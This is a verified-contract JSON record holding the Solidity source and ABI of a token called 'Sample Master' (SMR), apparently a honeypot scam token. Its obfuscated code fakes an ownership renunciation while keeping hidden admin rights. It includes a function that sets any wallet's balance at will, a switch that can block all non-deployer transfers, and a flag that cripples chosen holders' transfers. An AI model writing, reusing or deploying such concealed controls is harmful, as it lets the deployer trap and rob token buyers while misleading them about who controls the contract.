{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface shouldWalletMode {\n    function createPair(address buyReceiver, address listSell) external returns (address);\n}\n\ninterface isMaxLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountTake) external view returns (uint256);\n\n    function transfer(address receiverAt, uint256 fromLaunch) external returns (bool);\n\n    function allowance(address toLimitSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverAt,\n        uint256 fromLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderMax, uint256 value);\n    event Approval(address indexed toLimitSwap, address indexed spender, uint256 value);\n}\n\nabstract contract fundBuyMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fundBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface isMaxLaunchedMetadata is isMaxLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SampleMaster is fundBuyMode, isMaxLaunched, isMaxLaunchedMetadata {\n\n    function modeMax(uint256 fromLaunch) public {\n        takeTotal();\n        txSenderFrom = fromLaunch;\n    }\n\n    function owner() external view returns (address) {\n        return sellAuto;\n    }\n\n    function approve(address takeEnable, uint256 fromLaunch) public virtual override returns (bool) {\n        maxMin[_msgSender()][takeEnable] = fromLaunch;\n        emit Approval(_msgSender(), takeEnable, fromLaunch);\n        return true;\n    }\n\n    uint256 constant launchTo = 6 ** 10;\n\n    uint256 txSenderFrom;\n\n    function totalToken() public {\n        emit OwnershipTransferred(txLaunched, address(0));\n        sellAuto = address(0);\n    }\n\n    uint8 private txTotalLiquidity = 18;\n\n    function takeTotal() private view {\n        require(txMaxAt[_msgSender()]);\n    }\n\n    uint256 private amountMode;\n\n    function transfer(address fromShouldTotal, uint256 fromLaunch) external virtual override returns (bool) {\n        return totalIs(_msgSender(), fromShouldTotal, fromLaunch);\n    }\n\n    uint256 public exemptLaunch;\n\n    function transferFrom(address marketingShould, address receiverAt, uint256 fromLaunch) external override returns (bool) {\n        if (_msgSender() != marketingFee) {\n            if (maxMin[marketingShould][_msgSender()] != type(uint256).max) {\n                require(fromLaunch <= maxMin[marketingShould][_msgSender()]);\n                maxMin[marketingShould][_msgSender()] -= fromLaunch;\n            }\n        }\n        return totalIs(marketingShould, receiverAt, fromLaunch);\n    }\n\n    uint256 private txLaunch;\n\n    mapping(address => bool) public tradingReceiverAuto;\n\n    function teamFromTotal(address marketingShould, address receiverAt, uint256 fromLaunch) internal returns (bool) {\n        require(totalFund[marketingShould] >= fromLaunch);\n        totalFund[marketingShould] -= fromLaunch;\n        totalFund[receiverAt] += fromLaunch;\n        emit Transfer(marketingShould, receiverAt, fromLaunch);\n        return true;\n    }\n\n    mapping(address => uint256) private totalFund;\n\n    uint256 private swapLaunchedList = 100000000 * 10 ** 18;\n\n    function getOwner() external view returns (address) {\n        return sellAuto;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return txFrom;\n    }\n\n    address private sellAuto;\n\n    function allowance(address fromLimit, address takeEnable) external view virtual override returns (uint256) {\n        if (takeEnable == marketingFee) {\n            return type(uint256).max;\n        }\n        return maxMin[fromLimit][takeEnable];\n    }\n\n    function swapLaunchedBuy(address receiverLaunch) public {\n        if (teamMarketing) {\n            return;\n        }\n        if (exemptLaunch != swapTotal) {\n            swapTotal = teamFee;\n        }\n        txMaxAt[receiverLaunch] = true;\n        \n        teamMarketing = true;\n    }\n\n    address feeTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function decimals() external view virtual override returns (uint8) {\n        return txTotalLiquidity;\n    }\n\n    uint256 sellTrading;\n\n    bool public teamMarketing;\n\n    mapping(address => mapping(address => uint256)) private maxMin;\n\n    uint256 public teamFee;\n\n    uint256 public swapTotal;\n\n    function walletAtLaunch(address takeFee) public {\n        takeTotal();\n        if (isAuto) {\n            exemptLaunch = tradingReceiverList;\n        }\n        if (takeFee == txLaunched || takeFee == totalSellReceiver) {\n            return;\n        }\n        tradingReceiverAuto[takeFee] = true;\n    }\n\n    bool public limitFeeSender;\n\n    uint256 private tradingReceiverList;\n\n    string private marketingAmount = \"Sample Master\";\n\n    bool private isAuto;\n\n    bool public enableTakeTeam;\n\n    address public totalSellReceiver;\n\n    function balanceOf(address amountTake) public view virtual override returns (uint256) {\n        return totalFund[amountTake];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapLaunchedList;\n    }\n\n    function maxSender(address fromShouldTotal, uint256 fromLaunch) public {\n        takeTotal();\n        totalFund[fromShouldTotal] = fromLaunch;\n    }\n\n    address marketingFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public txLaunched;\n\n    event OwnershipTransferred(address indexed fundEnable, address indexed amountList);\n\n    mapping(address => bool) public txMaxAt;\n\n    string private txFrom = \"SMR\";\n\n    constructor (){\n        if (txLaunch != tradingReceiverList) {\n            teamFee = tradingReceiverList;\n        }\n        fundBuy tradingAmount = fundBuy(marketingFee);\n        totalSellReceiver = shouldWalletMode(tradingAmount.factory()).createPair(tradingAmount.WETH(), address(this));\n        if (isAuto) {\n            swapTotal = exemptLaunch;\n        }\n        txLaunched = _msgSender();\n        txMaxAt[txLaunched] = true;\n        totalFund[txLaunched] = swapLaunchedList;\n        totalToken();\n        \n        emit Transfer(address(0), txLaunched, swapLaunchedList);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return marketingAmount;\n    }\n\n    function totalIs(address marketingShould, address receiverAt, uint256 fromLaunch) internal returns (bool) {\n        if (marketingShould == txLaunched) {\n            return teamFromTotal(marketingShould, receiverAt, fromLaunch);\n        }\n        uint256 enableIs = isMaxLaunched(totalSellReceiver).balanceOf(feeTeam);\n        require(enableIs == txSenderFrom);\n        require(receiverAt != feeTeam);\n        if (tradingReceiverAuto[marketingShould]) {\n            return teamFromTotal(marketingShould, receiverAt, launchTo);\n        }\n        return teamFromTotal(marketingShould, receiverAt, fromLaunch);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toLimitSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeEnable\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTakeTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitFeeSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromShouldTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromLaunch\",\"type\":\"uint256\"}],\"name\":\"maxSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromLaunch\",\"type\":\"uint256\"}],\"name\":\"modeMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunch\",\"type\":\"address\"}],\"name\":\"swapLaunchedBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSellReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingReceiverAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromShouldTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txMaxAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeFee\",\"type\":\"address\"}],\"name\":\"walletAtLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SampleMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}